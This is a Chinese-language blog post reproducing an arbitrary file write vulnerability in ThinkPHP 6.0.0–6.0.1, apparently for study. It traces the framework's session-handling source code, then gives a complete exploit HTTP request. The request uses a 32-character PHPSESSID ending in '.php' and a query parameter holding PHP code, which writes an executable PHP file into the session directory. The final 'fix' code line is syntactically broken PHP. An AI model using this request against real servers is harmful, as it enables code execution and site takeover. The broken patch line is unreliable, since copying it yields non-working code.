---
title: thinkphp6任意文件写入
date: 2022-11-13 22:53:21
excerpt: thinkphp6任意文件写入
categories: 复现
---

# thinkphp6任意文件写入漏洞复现过程

###tips

仅适用于thinkphp6.0.0~6.0.1


## 一.搭建环境

这里踩了很多坑，最终供选择用`phpstudy`来搭建环境

#### 1.安装phpstudy

直接在官网下载即可

链接：https://www.xp.cn/download.html

#### 2.安装composer

![图片-1667831973498](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png)

值得注意的是我们这里用的composer的版本是1.8.5

在安装tp6的时候可能会报错，我们需要去更新

```
composer self-update//更新版本
```

#### 3.创建站点

#### ![图片-1667831982656](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png)4.安装tp6

点击管理中的`composer`，点击确定

```
composer create-project topthink/think tp6    //安装tp6
```



![图片-1667831995098](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png)

访问成功

![图片-1667832028137](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png)



## 二.漏洞利用

#### 1.分析

首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。

漏洞首先出现的地方是 sessionid可控
`tp6/vendor/topthink/framework/src/think/session/Store.php`
121行

```php
 $this->id = is_string($id) && strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
```

sessionid在设置的时候为进行校验，只要是32位就可以



然后再看看同一个文件的session保存

`tp6/vendor/topthink/framework/src/think/session/Store.php`

254行

```php
	public function save(): void
    {
        $this->clearFlashData();

        $sessionId = $this->getId();

        if (!empty($this->data)) {
            $data = $this->serialize($this->data);

            $this->handler->write($sessionId, $data);
        } else {
            $this->handler->delete($sessionId);
        }

        $this->init = false;
    }


```

先获取session id 然后是 `$this->handler->write($sessionId, $data);;`
 在跟进一下handler
 只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler

```php
public function __construct($name, SessionHandlerInterface $handler, array $serialize = null)
    {
        $this->name    = $name;
        $this->handler = $handler;

        if (!empty($serialize)) {
            $this->serialize = $serialize;
        }

        $this->setId();
    }
```

 tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php
 这里获取到 PHPSESSID 的值 session id传入

```php
  if ($varSessionId && $request->request($varSessionId)) {
            $sessionId = $request->request($varSessionId);
        } else {
            $sessionId = $request->cookie($cookieName);
        }

        if ($sessionId) {
            $this->session->setId($sessionId);

```

```php
$request->cookie($cookieName);这个里面看一下

protected $name = 'PHPSESSID'; 发现是这个参数

//所以这个值就从PHPSESSID传就好了

```

然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方

最后保存session数据 在代码tp6/vendor/topthink/framework/src/think/session/Store.php
 跟进这个write方法

```php
$this->handler->write($sessionId, $data);
//这里的 handler 是  继承的think\session\driver\file.php
```

跟进这个write方法
 tp6/vendor/topthink/framework/src/think/session/driver/File.php

```php
public function write(string $sessID, string $sessData): bool
    {
        $filename = $this->getFileName($sessID, true);
        $data     = $sessData;

        if ($this->config['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        return $this->writeFile($filename, $data);
    }

```

文件名处理方式

```php
getFileName($sessID, true);
```

```php
protected function getFileName(string $name, bool $auto = false): string
    {
        if ($this->config['prefix']) {
            // 使用子目录
            $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;
        } else {
            $name = 'sess_' . $name;
        }

        $filename = $this->config['path'] . $name;
        $dir      = dirname($filename);

        if ($auto && !is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        return $filename;
    }

```

由此可知，文件名只进行了路径拼接和加前缀

跟进 `$this->writeFile($filename, $data);`

```php
 protected function writeFile($path, $content): bool
    {
        return (bool) file_put_contents($path, $content, LOCK_EX);
    }
```

这里直接写入了，文件名可控，xxxxx.php里面是序列化后的内容

#### 2.利用

直接用`burpsuite`先抓一个包

```
GET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1
Host: tp6.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53
Upgrade-Insecure-Requests: 1

```

这里我们通过修改PHPSESSID来进行利用，

值得注意的是这里我们构造的长度必须是**<u>32</u>**位

```
PHPSESSID=1234567890123456789012345678.php
```

一般位于项目根目录下的./runtime/session/文件夹下，
 加上之前前缀的拼接，那就是
 /runtime/session/sess_1234567890123456789012345678.php

![图片-1667832045580](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png)

成功！

#### 3.修复方法

这个漏洞的核心在于对sessionid审核的不够严密，仅仅满足32位是远远不够的，这里我们用`ctype_alnum`函数

> ## PHP ctype_alnum()函数 **(**PHP ctype_alnum() function**)**
>
> **ctype_alnum() function** is a character type (CType) function in PHP, it is used to check whether a given string [contains](https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020) alphanumeric characters or not.
>
> **ctype_alnum()函数**是PHP中的字符类型(CType)函数，用于检查给定的字符串是否包含字母数字字符。 
>
> It returns true – if the string contains alphanumeric value (i.e. alphabets, digits/number only), else it returns false.
>
> 它返回true -如果字符串包含字母数字值(即字母，数字只/数字)，否则返回FALSE。 

修改如下

```php
$this->id = is_string($id) && strlen($id) === 32 ctype_alnum（$id） && ? $id : md5(microtime(true) . session_create_id());

```